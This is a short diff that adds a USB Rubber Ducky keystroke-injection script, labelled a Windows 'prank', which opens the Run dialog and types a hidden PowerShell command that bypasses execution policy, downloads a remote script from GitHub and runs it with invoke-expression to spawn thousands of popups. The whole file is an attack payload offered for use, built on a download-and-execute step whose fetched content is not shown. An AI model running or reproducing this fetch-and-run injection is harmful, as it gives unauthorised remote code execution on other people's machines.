@@ -1,0 +1,11 @@
+REM Title: Pop up hell
+REM Author: FalsePhilosopher
+REM Target: Win
+REM Props: Hak5, I-am-Jakoby for the IWR launch https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/Invoke-WebRequest.md and memes
+REM Version: 1.0
+REM Category: Prank
+REM spawns 9,999 popups
+GUI r
+DELAY 1000
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/FalsePhilosopher/BadUSB-Playground/main/Ducky/USBRubberducky/library/prank/Win/Popup_Hell/puh.ps1 ?dl=1; invoke-expression $pl
+ENTER
